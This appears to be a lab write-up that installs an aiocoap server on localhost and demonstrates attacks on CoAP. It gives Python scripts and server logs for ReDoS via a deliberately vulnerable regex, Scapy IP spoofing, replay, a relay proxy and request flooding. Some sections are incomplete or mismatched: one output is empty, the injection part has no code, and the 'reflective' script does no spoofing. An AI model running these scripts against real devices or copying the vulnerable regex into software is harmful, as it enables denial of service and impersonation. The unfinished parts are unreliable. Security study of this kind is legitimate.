# Constrained Application Protocol (CoAP) 

## Installation
To install a CoAP (Constrained Application Protocol) server with logging enabled, Here are general steps for setting up a CoAP server using a popular library in Python called aiocoap, which is an asynchronous CoAP framework:
source: https://git.fslab.de/jkonra2m/aiocoapMC
### Prerequisites
+ Python 3.7 or higher
+ pip (Python package installer)
+ It imports the necessary modules from Python's asyncio library for asynchronous programming and various components from the aiocoap library.

## CoAP Server Installation
I used  this repository which used aiccopa server.
https://github.com/chrysn/aiocoap/blob/master/server.py
aiocoap is published under the MIT License, and follows the best practice of reuse.software.
aiocoap was originally based on txThings by Maciej Wasilak. The full list of aiocoap contributors can be obtained from the version control history.

### Output
```bash
INFO:websockets.server:server listening on [::]:8683
INFO:websockets.server:server listening on 0.0.0.0:8683
DEBUG:coap-server:Server ready to receive requests
```
# Attacks
For the Constrained Application Protocol (CoAP), various types of attacks are identified, as detailed in the provided document. Here's a list of attacks on the CoAP protocol:

## 1. **Regular Expression Denial of Service (ReDoS)**: 
This attack exploits inefficiencies in regular expression processing algorithms to create service denials. Implement a regex in the CoAP resource that is known for causing performance issues when given specially crafted inputs, such as (a+)+$.
[hier](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) can find more information about this attack in details.
Depending on what your CoAP resource processes, payloads or URI paths that exploit the regex vulnerability. For instance, if the CoAP server uses a regex to validate query parameters, your malicious input would be included as a query parameter in the CoAP request.
### Change in server.py
new resource called RegexResource and library added to the server.
This resource and liberary 're' uses a vulnerable regex to parse the input.
```python
import re

class RegexResource(resource.Resource):
    
    async def render_get(self, request):

        pattern = r"^(a+)+$"
        input_string = request.payload.decode('utf-8')
        
        if re.match(pattern, input_string):
            return aiocoap.Message(content_format=ContentFormat.TEXT, payload=b"Matched")
        else:
            return aiocoap.Message(content_format=ContentFormat.TEXT, payload=b"Not Matched")

# Add this resource to the server
root.add_resource(['vulnerable'], RegexResource())
```
### Exploit
```python
async def main():
    context = await Context.create_client_context()

    payload = b"a" * 50000  # Long sequence of 'a's
    request = Message(code=GET, payload=payload, uri="coap://localhost/vulnerable")

    response = await context.request(request).response

    print('Result: %s\n%r' % (response.code, response.payload))

if __name__ == "__main__":
    asyncio.run(main())
```
### Func
This Exploit sends a very long string of 'a's to the server, which, due to the regex (a+)+$, causes catastrophic backtracking, potentially freezing or significantly slowing down the server. This illustrates a basic ReDoS attack scenario.
### Output
```bash
INFO:websockets.server:server listening on 0.0.0.0:8683
INFO:websockets.server:server listening on [::]:8683
DEBUG:coap-server:Server ready to receive requests
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd47051d850: CON GET (MID 16783, token 5bde) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=0, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470554110: ACK 2.31 Continue (MID 16783, token 5bde) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470537f90: CON GET (MID 16784, token 5bdf) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=1, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470554b10: ACK 2.31 Continue (MID 16784, token 5bdf) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470554a50: CON GET (MID 16785, token 5be0) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=2, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470555610: ACK 2.31 Continue (MID 16785, token 5be0) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470555550: CON GET (MID 16786, token 5be1) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=3, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd4705560d0: ACK 2.31 Continue (MID 16786, token 5be1) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470556010: CON GET (MID 16787, token 5be2) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
.
.
block_number 4 until 46
.
.
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=47, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470577c90: ACK 2.31 Continue (MID 16830, token 5c0d) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470577bd0: CON GET (MID 16831, token 5c0e) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 848 byte(s) payload>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd47057c710: ACK 2.05 Content (MID 16831, token 5c0e) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 2 option(s), 7 byte(s) payload>

```
# IP Address Spoofing: 
This involves altering the sending IP address within UDP packets to impersonate another device or service.
With Scapy, we can simply craft packets and send them. So, if we spoof the source address and send it, the network accepts and returns the response to the spoofed address. Now, we can create a script to ping a system with a spoofed IP [Python Penetration Testing Cookbook](https://download.packt.com/free-ebook/9781784399771).

Scapy is a powerful interactive packet manipulation library written in Python. Scapy is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more.[https://scapy.net/]
### Exploit
```python
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.contrib.coap import *

def send_spoofed_packet(target_ip, spoofed_ip, target_port=5683):
    coap_layer = CoAP(type=1, code=1)
    udp_layer = UDP(sport=RandShort(), dport=target_port)
    ip_layer = IP(src=spoofed_ip, dst=target_ip)

    packet = ip_layer / udp_layer / coap_layer
    send(packet)

target_ip = '127.0.0.1'  # Target aiocoap server IP
spoofed_ip = '127.0.0.1'  # Spoofed source IP

send_spoofed_packet(target_ip, spoofed_ip)
```   
# Replay Attacks: 
This type of attack captures legitimate messages and resends them to perform unauthorized operations.
To execute a Replay Attack against the CoAP server you've described, first need to capture a legitimate CoAP message and then replay this message multiple times to the server.
https://www.ietf.org/archive/id/draft-ietf-core-attacks-on-coap-04.html
## Exploit
```python
import logging
import asyncio
from aiocoap import *

logging.basicConfig(level=logging.INFO)

async def replay_attack(context, request, repeat=10):
    """Replay the same request multiple times."""
    for _ in range(repeat):
        response = await context.request(request).response
        print(f'Result: {response.code} Payload: {len(response.payload)} bytes')

async def main():
    context = await Context.create_client_context()

    await asyncio.sleep(2)

    payload = b"The_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\n" * 30
    request = Message(code=PUT, payload=payload, uri="coap://localhost/other/block")

    await replay_attack(context, request, repeat=10)

if __name__ == "__main__":
    asyncio.run(main())

```
## Func
First, capture a legitimate CoAP request. This can be done by using network sniffing tools such as Wireshark or tcpdump while you send a request from a legitimate client.
Once captured, this request can be replayed using a tool capable of sending raw packets, such as Scapy in Python, or even by scripting repeated send operations in an environment that supports CoAP communications, like aiocoap.
## Output
```bash
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f235ea38390: CON PUT (MID 27197, token 7826) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=0, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f235ea58350: ACK 2.31 Continue (MID 27197, token 7826) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f235ea3b350: CON PUT (MID 27198, token 7827) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 3 option(s), 476 byte(s) payload>
DEBUG:coap-server:New unique message received
PUT payload: b'The_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\n'
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f235ea58f10: ACK 2.04 Changed (MID 27198, token 7827) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 2 option(s), 1024 byte(s) payload>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f235ea59110: CON PUT (MID 27199, token 7828) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 3 option(s)>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f235ea597d0: ACK 2.04 Changed (MID 27199, token 7828) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 1 option(s), 476 byte(s) payload>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f235ea59d10: CON PUT (MID 27200, token 7829) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=0, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f235ea5a990: ACK 2.31 Continue (MID 27200, token 7829) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f235ea5a890: CON PUT (MID 27201, token 782a) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 3 option(s), 476 byte(s) payload>
DEBUG:coap-server:New unique message received
PUT payload: b'The_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\nThe_Test_Packet_for_Replay_Attcks_in_CoAP_Server.\n'
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f235ea58dd0: ACK 2.04 Changed (MID 27201, token 782a) remote <UDP6EndpointAddress [::1]:56522 (locally ::1%lo)>, 2 option(s), 1024 byte(s) payload>
... 30 times
```
# Relay Attacks: 
These attacks involve capturing and retransmitting messages in real-time, which can be used to bypass authentication mechanisms.
Relay Attack against the CoAP server would typically intercept and immediately forward CoAP messages to manipulate or exploit the system in real-time. This can be particularly effective against systems that use step-wise authentication or authorization that could be bypassed or fooled by relaying messages between legitimate clients and the server.
## Exploit
```python
import asyncio
from aiocoap import *

class CoAPRelay:
    def __init__(self, target_uri, listen_port=5683):
        self.target_uri = target_uri
        self.listen_port = listen_port

    async def start_proxy(self):
        # Create a server context to listen for incoming requests
        proxy = await Context.create_server_context(self.handle_request, bind=('localhost', self.listen_port))
        print(f"Proxy server started on port {self.listen_port}. Forwarding requests to {self.target_uri}.")

    async def handle_request(self, request):
        print("Received request from client, relaying to server...")
        # Create a new client context to forward the request
        context = await Context.create_client_context()

        # Modify the request to target the actual server
        request.remote = None
        request.opt.uri_host = self.target_uri.split("//")[1]
        request.opt.uri_port = 5683

        # Forward the request and wait for the response
        response = await context.request(request).response

        print(f"Received response from server, sending back to client...")
        return response

async def main():
    # Target server URI
    target_uri = 'coap://localhost/other/block'
    
    # Create the relay
    relay = CoAPRelay(target_uri=target_uri)

    # Start the proxy server
    await relay.start_proxy()

if __name__ == "__main__":
    asyncio.run(main())
```
## Func
A request from a legitimate client is intercepted, the intercepted request is immediately sent to the target server and the response from the server can be sent back to the original client, making the process transparent and maintaining functionality.
The Exploit is positioned in the network where they can intercept and forward traffic between a client and a server. The attacker capture legitimate authentication requests from a client and relay them to the server to gain unauthorized access or execute commands that rely on client credentials.
## Output

# Injection Attacks: 
These occur by intercepting a TCP communication to inject malicious TCP segments into legitimate packets, carrying modified CoAP messages that interfere with server operations.
   
# CoAP Amplification DoS Attack: 
Attackers send multiple CoAP GET or POST requests to create large responses from small requests, thereby straining network resources and amplifying traffic.
In this aiocoap server there 

### Exploit
```python
import asyncio
from aiocoap import *

async def amplify_attack(target_uri):
    context = await Context.create_client_context()
    request = Message(code=GET, uri=target_uri)

    while True: 
        try:
            response = await context.request(request).response
            print(f'Received {len(response.payload)} bytes from {target_uri}')
        except Exception as e:
            print(f'Failed to fetch resource from {target_uri}:', e)

async def main():

    block_uri = 'coap://localhost/other/block'
    separate_uri = 'coap://localhost/other/separate'

    task1 = amplify_attack(block_uri)
    task2 = amplify_attack(separate_uri)
    
    await asyncio.gather(task1, task2)

if __name__ == "__main__":
    asyncio.run(main())

```
### Func
In the server code you shared, the BlockResource and SeparateLargeResource are especially suitable for this kind of exploitation because they are designed to send large responses or payloads that are much larger than the incoming request.
This resource responds with a large payload that is designed to trigger blockwise transfers. The payload grows to ensure that it is large enough to demonstrate blockwise transfer capabilities moreover This resource simulates a long-running operation and responds with a relatively large and static literary payload.
The strategy involves flooding the server with GET requests to these resources. The amplification factor here is the ratio of the outgoing response size to the incoming request size. Given that CoAP headers are minimal and the responses are large, the amplification factor can be significant.
### Output
```bash
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f7062c34310: CON GET (MID 50232, token 3847) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f7062c60110: ACK 2.05 Content (MID 50232, token 3847) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 1 option(s), 202 byte(s) payload>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f7062c37ed0: CON GET (MID 50233, token 3848) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f7062c61050: ACK 2.05 Content (MID 50233, token 3848) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 1 option(s), 202 byte(s) payload>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f7062c60950: CON GET (MID 50234, token 3849) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
... too many
```
# **Reflective Denial of Service (DoS)**: 
Employing legitimate requests to third-party servers that are then amplified and reflected back to the victim .
A client sends a request to the server, and the server sends the response back to the client's IP. An attacker sends a request to the server, but the request is crafted such that the server sends a disproportionately large response to a victim's IP address.
## Exploit 
```python
import asyncio
from aiocoap import *

async def send_coap_request(target_uri):
    context = await Context.create_client_context()
    request = Message(code=GET, uri=target_uri)

    try:
        response = await context.request(request).response
        print(f'Response from {target_uri}: {response.payload.decode()}')
    except Exception as e:
        print(f'Failed to fetch resource from {target_uri}:', e)

async def main():
    resource_uri = 'coap://localhost/other/block'
    await send_coap_request(resource_uri)

if __name__ == "__main__":
    asyncio.run(main())
```
## Func
Attacker sends a CoAP request to the server with a spoofed source IP address. The server sends a large response (from BlockResource or SeparateLargeResource) back to the victimâ€™s IP address. The victim receives unsolicited CoAP responses, consuming their bandwidth or processing resources.
## Output
```bash
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f959811afd0: CON GET (MID 33434, token 8df8) remote <UDP6EndpointAddress [::1]:56925 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f9598150050: ACK 2.05 Content (MID 33434, token 8df8) remote <UDP6EndpointAddress [::1]:56925 (locally ::1%lo)>, 1029 byte(s) payload>
```

These attacks exploit various aspects of the CoAP protocol and its implementations, highlighting the importance of robust security measures to mitigate these threats.